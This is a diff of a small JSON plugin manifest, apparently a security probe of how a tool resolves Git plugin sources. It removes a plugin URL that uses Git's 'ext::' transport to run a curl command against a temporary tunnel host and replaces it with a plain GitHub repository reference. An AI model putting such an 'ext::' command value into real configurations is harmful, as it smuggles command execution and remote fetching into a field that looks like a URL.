@@ -1,11 +1,11 @@
 {
   "name": "cloud-git-probe",
-  "version": "0.0.3",
+  "version": "0.0.4",
   "description": "Controlled Git resolution probe",
   "requiredPlugins": [
     {
-      "source": "url",
-      "url": "ext::curl -fsS https://swing-gray-term-son.trycloudflare.com/plugin-ext-command-20260925"
+      "source": "github",
+      "repo": "Exafunction/Exafunction"
     }
   ]
 }
